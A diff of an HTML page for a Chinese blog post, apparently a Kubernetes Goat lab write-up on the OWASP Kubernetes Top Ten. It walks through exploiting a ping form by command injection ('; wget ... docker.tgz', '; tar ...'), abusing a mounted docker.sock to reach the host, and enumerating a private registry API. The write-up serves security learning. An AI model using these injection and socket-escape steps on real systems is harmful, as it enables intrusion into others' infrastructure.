@@ -21,28 +21,28 @@
     <meta name="description" content="blogs from f10@t">
     <meta name="description" content="之前入门学习了k8s集群环境的搭建和基本概念包括框架、网络模型，部署与动态扩展服务的方法：  Kubernetes 集群环境搭建使用及问题记录（一） Kubernetes-集群环境搭建使用及问题记录（二） Kubernetes-集群环境搭建使用及问题记录（三）  当然也要回归安全的课题上来，云安全本质上是传统安全在云原生环境下的重新思考。作为业内事实标准，k8s可以提供服务管理、">
 <meta property="og:type" content="article">
-<meta property="og:title" content="K8s攻防之OWASP-K8S-TOP10">
+<meta property="og:title" content="K8s攻防之OWASP-K8S-TOP10（上）">
 <meta property="og:url" content="https://lzwgiter.github.io/posts/8aa36aba.html">
 <meta property="og:site_name" content="f10@t&#39;s blog">
 <meta property="og:description" content="之前入门学习了k8s集群环境的搭建和基本概念包括框架、网络模型，部署与动态扩展服务的方法：  Kubernetes 集群环境搭建使用及问题记录（一） Kubernetes-集群环境搭建使用及问题记录（二） Kubernetes-集群环境搭建使用及问题记录（三）  当然也要回归安全的课题上来，云安全本质上是传统安全在云原生环境下的重新思考。作为业内事实标准，k8s可以提供服务管理、">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://lzwgiter.github.io/img/K8s%E6%94%BB%E9%98%B2%E4%B9%8BOWASP-K8S-TOP10/image-20230917222234007.png">
-<meta property="og:image" content="https://lzwgiter.github.io/img/K8s%E6%94%BB%E9%98%B2%E4%B9%8BOWASP-K8S-TOP10/image-20230918204405720.png">
-<meta property="og:image" content="https://lzwgiter.github.io/img/K8s%E6%94%BB%E9%98%B2%E4%B9%8BOWASP-K8S-TOP10/image-20230918205420522.png">
-<meta property="og:image" content="https://lzwgiter.github.io/img/K8s%E6%94%BB%E9%98%B2%E4%B9%8BOWASP-K8S-TOP10/image-20230918210321217.png">
-<meta property="og:image" content="https://lzwgiter.github.io/img/K8s%E6%94%BB%E9%98%B2%E4%B9%8BOWASP-K8S-TOP10/image-20230918222854330.png">
+<meta property="og:image" content="https://lzwgiter.github.io/img/K8s%E6%94%BB%E9%98%B2%E4%B9%8BOWASP-K8S-TOP10%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230917222234007.png">
+<meta property="og:image" content="https://lzwgiter.github.io/img/K8s%E6%94%BB%E9%98%B2%E4%B9%8BOWASP-K8S-TOP10%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230918204405720.png">
+<meta property="og:image" content="https://lzwgiter.github.io/img/K8s%E6%94%BB%E9%98%B2%E4%B9%8BOWASP-K8S-TOP10%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230918205420522.png">
+<meta property="og:image" content="https://lzwgiter.github.io/img/K8s%E6%94%BB%E9%98%B2%E4%B9%8BOWASP-K8S-TOP10%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230918210321217.png">
+<meta property="og:image" content="https://lzwgiter.github.io/img/K8s%E6%94%BB%E9%98%B2%E4%B9%8BOWASP-K8S-TOP10%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230920153859379.png">
 <meta property="article:published_time" content="2023-09-16T07:25:21.000Z">
-<meta property="article:modified_time" content="2023-09-19T03:20:49.909Z">
+<meta property="article:modified_time" content="2023-09-20T08:32:56.875Z">
 <meta property="article:author" content="lzwgiter">
 <meta property="article:tag" content="Kubernete">
 <meta property="article:tag" content="云安全">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://lzwgiter.github.io/img/K8s%E6%94%BB%E9%98%B2%E4%B9%8BOWASP-K8S-TOP10/image-20230917222234007.png">
+<meta name="twitter:image" content="https://lzwgiter.github.io/img/K8s%E6%94%BB%E9%98%B2%E4%B9%8BOWASP-K8S-TOP10%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230917222234007.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/hello.svg">
     
-    <title>K8s攻防之OWASP-K8S-TOP10 · f10@t&#39;s blog</title>
+    <title>K8s攻防之OWASP-K8S-TOP10（上） · f10@t&#39;s blog</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -289,7 +289,7 @@
                 <a href="/">f10@t&#39;s blog</a>
             </div>
             <div class="post-title header-element">
-                <a href="#" class="post-name">K8s攻防之OWASP-K8S-TOP10</a>
+                <a href="#" class="post-name">K8s攻防之OWASP-K8S-TOP10（上）</a>
             </div>
         </div>
     
@@ -335,7 +335,7 @@
         <h1 class="intro-title">
             <!-- 主页  -->
             
-                K8s攻防之OWASP-K8S-TOP10
+                K8s攻防之OWASP-K8S-TOP10（上）
             <!-- 404 -->
             
         </h1>
@@ -377,7 +377,7 @@
                 <!-- 文章字数统计 -->
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">3.7k</span>阅读时长: <span class="post-count reading-time">15 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">5.6k</span>阅读时长: <span class="post-count reading-time">24 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -551,8 +551,8 @@ target="_blank" rel="noopener" href="https://www.f10at.cn/posts/ed901271.html">K
 <p>当然也要回归安全的课题上来，云安全本质上是传统安全在云原生环境下的重新思考。作为业内事实标准，k8s可以提供服务管理、扩容等诸多功能，是提供云原生能力的基石。</p>
 <p>因此后面计划首先学习云安全分支下的k8s安全，并同时学习docker中的常见安全问题。这篇先学习<a
 target="_blank" rel="noopener" href="https://owasp.org/www-project-kubernetes-top-ten/">OWASP
-Kubernetes Top Ten</a>。</p>
-<p><img src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230917222234007.png" style="zoom:60%;" /></p>
+Kubernetes Top Ten</a>的前五个。</p>
+<p><img src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917222234007.png" style="zoom:60%;" /></p>
 </blockquote>
 <span id="more"></span>
 <h1 id="k8s环境准备">K8S环境准备</h1>
@@ -567,23 +567,23 @@ Kubernetes Top Ten</a>。</p>
 <p>这里有一个小插曲，打开后发现我的kubelet服务没有起来，提示客户端证书过期了</p>
 </blockquote>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230916152715777.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230916152715777.png" /></p>
 <p>用<code>kubeadm</code>检查一下，还真是</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230916153006771.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230916153006771.png" /></p>
 <p>解决方法：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份旧证书</span></span><br><span class="line">cd /etc/kubernetes/pki/</span><br><span class="line">mkdir 2023-09-16-pki-backup</span><br><span class="line">mv *.key *.crt sa.pub etcd/ 2023-09-16-pki-backup/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新生成证书</span></span><br><span class="line">kubeadm init phase certs all</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份历史配置文件</span></span><br><span class="line">cd /etc/kubernetes</span><br><span class="line">mkdir 2023-09-16-k8s-backup</span><br><span class="line">mv  *.conf 2023-09-16-k8s-backup/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新生成配置文件</span></span><br><span class="line">kubeadm init phase kubeconfig all</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新管理员配置文件以确保kubectl的正常使用</span></span><br><span class="line">cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br></pre></td></tr></table></figure>
 <p>这时候查看<code>kubelet</code>状态就恢复了：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230916162300287.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230916162300287.png" /></p>
 <p>However，这时候从节点还是g的：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230916162543423.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230916162543423.png" /></p>
 <p>这是因为这两节点的<code>kubelet.conf</code>还没有更新，下面做更新操作</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">筛选Kube-scheduler的容器</span></span><br><span class="line">docker ps -a | grep kube-scheduler | awk ‘&#123;print $1&#125;’</span><br><span class="line">docker rm -f 上述容器</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">等待重启状态恢复到1/1</span></span><br><span class="line">kubectl get pods -n kube-system | grep scheduler</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">分别生成从节点的kebelet.conf文件（版本号、节点名称需要改成你自己的）并拷贝</span></span><br><span class="line">kubeadm init --kubernetes-version=v1.22.2 phase kubeconfig kubelet --node-name k8s-node01 --kubeconfig-dir ~/</span><br><span class="line">scp ~/kubelet.conf k8s-node01:/etc/kubernets/</span><br><span class="line"></span><br><span class="line">kubeadm init --kubernetes-version=v1.22.2 phase kubeconfig kubelet --node-name k8s-node01 --kubeconfig-dir ~/</span><br><span class="line">scp ~/kubelet.conf k8s-node02:/etc/kubernets/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启所有虚拟机</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
 <p>然后就恢复了：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230917143430965.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917143430965.png" /></p>
 <blockquote>
 <p>这个问题属于<strong>K8s证书过期</strong>的日常问题，这里我是手动解决的。查阅资料过程中发现也有其它自动化解决手段，什么自动证书轮转，这里暂时不继续探究。</p>
 </blockquote>
@@ -597,25 +597,25 @@ target="_blank" rel="noopener" href="https://helm.sh/">Helm</a>，类似apt和yu
 </ol>
 <p>安装结果如下：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230917152553267.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917152553267.png" /></p>
 <p>稍等一会儿后，可以看到当前活动的pods：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230917164629557.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917164629557.png" /></p>
 <p>最后运行<code>access-kubernetes-goat.sh</code>脚本即可完成环境搭建：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230917164804225.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917164804225.png" /></p>
 <blockquote>
 <p>但是这里又出问题了，执行后我并没有看到出现新的Pod，且端口不可访问，因为原脚本将输出重定向到了null。因此单独执行命令后发现如下问题，目前尚未解决，已发起issue提问：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230917221219482.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917221219482.png" /></p>
 </blockquote>
 <p>考虑到这里只是想要转发一个端口，因此我自己重新写了一下这个脚本，换为<code>expose</code>的方式：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Author: lzwigter&lt;float311@163.com&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This program has been created as part of Kubernetes Goat, but using expose instead of using port-forward,</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Kubernetes Goat Access vulnerable infrastructure</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Checking kubectl setup</span></span><br><span class="line">kubectl version --short &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">if [ $? -eq 0 ];</span><br><span class="line">then</span><br><span class="line">    echo &quot;kubectl setup looks good.&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;Please check kubectl setup.&quot;</span><br><span class="line">    exit;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">echo &#x27;Creating service expose for all the Kubernetes Goat resources to locally.&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exposing Sensitive keys <span class="keyword">in</span> code bases Scenario</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">export</span> POD_NAME=$(kubectl get pods --namespace default -l <span class="string">&quot;app=build-code&quot;</span> -o jsonpath=<span class="string">&quot;&#123;.items[0].metadata.name&#125;&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl port-forward <span class="variable">$POD_NAME</span> --address 0.0.0.0 1230:3000 &gt; /dev/null 2&gt;&amp;1 &amp;</span></span><br><span class="line">kubectl expose deployment build-code-deployment --port 3000 --type=NodePort</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exposing DIND (docker-in-docker) exploitation Scenario</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">export</span> POD_NAME=$(kubectl get pods --namespace default -l <span class="string">&quot;app=health-check&quot;</span> -o jsonpath=<span class="string">&quot;&#123;.items[0].metadata.name&#125;&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">kubectl port-forward <span class="variable">$POD_NAME</span> --address 0.0.0.0 1231:80 &gt; /dev/null 2&gt;&amp;1 &amp;</span></span><br><span class="line">kubectl expose deployment health-check-deployment --port 80  --type=NodePort</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exposing SSRF <span class="keyword">in</span> K8S world Scenario</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">export</span> POD_NAME=$(kubectl get pods --namespace default -l <span class="string">&quot;app=internal-proxy&quot;</span> -o jsonpath=<span class="string">&quot;&#123;.items[0].metadata.name&#125;&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl port-forward <span class="variable">$POD_NAME</span> --address 0.0.0.0 1232:3000 &gt; /dev/null 2&gt;&amp;1 &amp;</span></span><br><span class="line">kubectl expose deployment internal-proxy-deployment --port 3000 --type=NodePort</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exposing Container escape to access host system Scenario</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">export</span> POD_NAME=$(kubectl get pods --namespace default -l <span class="string">&quot;app=system-monitor&quot;</span> -o jsonpath=<span class="string">&quot;&#123;.items[0].metadata.name&#125;&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl port-forward <span class="variable">$POD_NAME</span> --address 0.0.0.0 1233:8080 &gt; /dev/null 2&gt;&amp;1 &amp;</span></span><br><span class="line">kubectl expose deployment system-monitor-deployment --port 8080 --type=NodePort</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exposing Kubernetes Goat Home</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">export</span> POD_NAME=$(kubectl get pods --namespace default -l <span class="string">&quot;app=kubernetes-goat-home&quot;</span> -o jsonpath=<span class="string">&quot;&#123;.items[0].metadata.name&#125;&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl port-forward <span class="variable">$POD_NAME</span> --address 0.0.0.0 1234:80 &gt; /dev/null 2&gt;&amp;1 &amp;</span></span><br><span class="line">kubectl expose deployment kubernetes-goat-home-deployment --port 80 --type=NodePort</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exposing Attacking private registry Scenario</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">export</span> POD_NAME=$(kubectl get pods --namespace default -l <span class="string">&quot;app=poor-registry&quot;</span> -o jsonpath=<span class="string">&quot;&#123;.items[0].metadata.name&#125;&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl port-forward <span class="variable">$POD_NAME</span> --address 0.0.0.0 1235:5000 &gt; /dev/null 2&gt;&amp;1 &amp;</span></span><br><span class="line">kubectl expose deployment poor-registry-deployment --port 5000 --type=NodePort</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exposing DoS resources Scenario</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">export</span> POD_NAME=$(kubectl get pods --namespace big-monolith -l <span class="string">&quot;app=hunger-check&quot;</span> -o jsonpath=<span class="string">&quot;&#123;.items[0].metadata.name&#125;&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl --namespace big-monolith port-forward <span class="variable">$POD_NAME</span> --address 0.0.0.0 1236:8080 &gt; /dev/null 2&gt;&amp;1 &amp;</span></span><br><span class="line">kubectl expose deployment hunger-check-deployment -n big-monolith --port 8080 --type=NodePort</span><br><span class="line"></span><br><span class="line">echo &quot;Check kubectl get svc -o wide and  visit app kubernetes-goat-home-deployment&quot;</span><br></pre></td></tr></table></figure>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230917221826007.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917221826007.png" /></p>
 <p>上面红框中的home服务为入口：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230917220721962.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917220721962.png" /></p>
 <h1 id="owasp-kubernets-top-10">OWASP Kubernets Top 10</h1>
 <h2 id="k01-insecure-workload-configurations">K01: Insecure Workload
 Configurations</h2>
@@ -652,19 +652,19 @@ id="对应k8s-goat场景dind-docker-in-docker-exploitation">对应k8s-goat场景
 <p>该攻击方法从战术上属于<code>Initial Access</code>，技术上属于<code>Application Vulnerbility</code>。</p>
 </blockquote>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/scenario-2-29ce411f882ff11438dfdd96b7fa45fd.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/scenario-2-29ce411f882ff11438dfdd96b7fa45fd.png" /></p>
 <p>下面正式分析，首先访问对应端口：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230918193325808.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918193325808.png" /></p>
 <p>这个应用对应的是<code>health-check</code>，根据场景介绍，我们的目标是逃出这个容器并访问所在主机。上帝视角先看一下这个pod的情况：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230918193627852.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918193627852.png" /></p>
 <p>位于我集群中第二个节点上。</p>
 <h3 id="预备知识关于docker.sock">预备知识：关于docker.sock</h3>
 <p><code>docker.sock</code>是一个socket文件，我们平常新建容器等用到的docker命令本质上是一个客户端，通过向docker
 daemon发出请求以管理容器。如下图：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/architecture-1695038714046-4.svg" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/architecture-1695038714046-4.svg" /></p>
 <p>而docker daemon监听的方式也有两种：</p>
 <ul>
 <li>UNIX 域套接字</li>
@@ -673,44 +673,44 @@ src="/img/K8s攻防之OWASP-K8S-TOP10/architecture-1695038714046-4.svg" /></p>
 <p>前者会在本地创建一个<code>/var/run/docker.socket</code>，仅用于本机上不同进程之间的网络通信。而后者则支持其他机器的操作。<strong>默认情况下，docker使用的是UNIX域套接字，我们可以使用docker
 -H参数来进行指定</strong>，如：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230918200915674.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918200915674.png" /></p>
 <p>这两条命令结果是一样的，因为默认就是走的本地的UNIX域套接字。当然也可以走TCP，这里访问一下我屋里orangepi上的docker：</p>
 <p>首先使用<code>dockerd -H tcp://0.0.0.0:2375</code>打开一个在2375端口上tcp监听的docker
 daemon</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230918202439022.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918202439022.png" /></p>
 <p>可以看到输出也提示了这样的做法是不安全的，然后我们远程连接：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230918202542445.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918202542445.png" /></p>
 <p>证明了我们拥有了管理远程机器docker容器的能力。</p>
 <h3 id="利用">利用</h3>
 <p>看一下页面，提供了一个ping的功能：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230918194156807.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918194156807.png" /></p>
 <p>Web人说话了，命令注入白？</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230918194322450.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918194322450.png" /></p>
 <p>还真是，还是root妈诶。那下面我们就得考虑怎么从这个容器出去了，站在上帝视角上，我们再看看这个pods的详情：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230918194715209.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918194715209.png" /></p>
 <p>在详情中我们看到了该容器挂载了所在主机的<code>/var/run/docker.sock</code>。在前述预备知识下，这里就知道了要利用docker.sock的作用以及<code>docker -H</code>。</p>
 <p>回到网页，我们先用<code>mount</code>命令查看挂载内容判断是否存在<code>docker.sock</code>。</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230918203512342.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918203512342.png" /></p>
 <p>可以看到UNIX域套接字的socket，但是当前容器中没有安装docker客户端：</p>
-<p><img src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230918204405720.png" style="zoom:60%;" /></p>
+<p><img src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918204405720.png" style="zoom:60%;" /></p>
 <p>Ok点题了，所以叫DIND，我们得给这个容器里下一个客户端了。官方提供了下载列表供我们直接使用：<code>https://download.docker.com/linux/static/stable/x86_64/</code>。因此分别执行命令：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载客户端</span></span><br><span class="line">; wget https://download.docker.com/linux/static/stable/x86_64/docker-24.0.6.tgz -O /home/docker.tgz</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压使用</span></span><br><span class="line">; tar -zvxf /home/docker.tgz -C /home/</span><br></pre></td></tr></table></figure>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230918205332118.png" /></p>
-<p><img src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230918205420522.png" style="zoom:60%;" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918205332118.png" /></p>
+<p><img src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918205420522.png" style="zoom:60%;" /></p>
 <p>然后我们就可以使用那个挂载的socket了：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230918205650826.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918205650826.png" /></p>
 <p>到这里结束，我们就获得了运行该容器的主机上的所有运行容器，完成了一定的<strong>信息收集</strong>。并可根据此进一步去访问其他容器资源。</p>
 <h3 id="问题原因">问题原因</h3>
 <p>从该deployment的配置文件中就可以看到，能出现这个问题本质原因就在于该容器是提权了的。此外也没有对主机文件访问做可读限制，导致了我们可以下载一个docker客户端，从而完成DIND攻击。</p>
-<p><img src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230918210321217.png" style="zoom:50%;" /></p>
+<p><img src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918210321217.png" style="zoom:50%;" /></p>
 <h3 id="参考学习">参考学习</h3>
 <ul>
 <li><a
@@ -773,10 +773,11 @@ private registry</h3>
 <p>该攻击方法从战术上属于<code>Initial Access</code>，技术上属于<code>Compromised image in registry</code>。</p>
 </blockquote>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/scenario-7-fbcf2b81257e7185ddfa569b9089e34d-1695046803656-11.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/scenario-7-fbcf2b81257e7185ddfa569b9089e34d-1695046803656-11.png" /></p>
 <p>下面正式分析，首先访问对应端口：</p>
 <figure>
-<img src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230918222854330.png"
+<img
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918222854330.png"
 alt="image-20230918222854330" />
 <figcaption aria-hidden="true">image-20230918222854330</figcaption>
 </figure>
@@ -788,27 +789,27 @@ target="_blank" rel="noopener" href="https://hub.docker.com/">Docker
 Hub</a>，私人的比如阿里云控制台可以管理的个人实例。还是那个图，最右侧就是docker
 registry服务：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/architecture-1695038714046-4.svg" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/architecture-1695038714046-4.svg" /></p>
 <p>对于私有的镜像，我们也可以自己搭建一个私有的registry服务，通常运行在5000端口上。搭建完成后我们就可以通过<code>pull</code>、<code>push</code>等命令管理该registry上的私有镜像。</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230919103226887.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230919103226887.png" /></p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230919103344035.png" /></p>
-<p>此外，该服务提供了RESTful风格的接口，使用方法官方文档：<a
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230919103344035.png" /></p>
+<p>此外，该服务提供了docekr服务端提供的RESTful风格的接口，使用方法官方文档：<a
 target="_blank" rel="noopener" href="https://docs.docker.com/registry/spec/api/">HTTP API V2 | Docker
 Docs</a>。</p>
 <h3 id="利用-1">利用</h3>
 <p>打开页面，我们访问<code>/v2</code>，返回200则说明是支持v2版本的API的：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230919104909189.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230919104909189.png" /></p>
 <p>我们可以利用API接口列出所有镜像：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230919104855799.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230919104855799.png" /></p>
 <p>我们分别读取这两个镜像的<code>manifest</code>文件以收集信息：</p>
 <p><img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230919105703471.png" /></p>
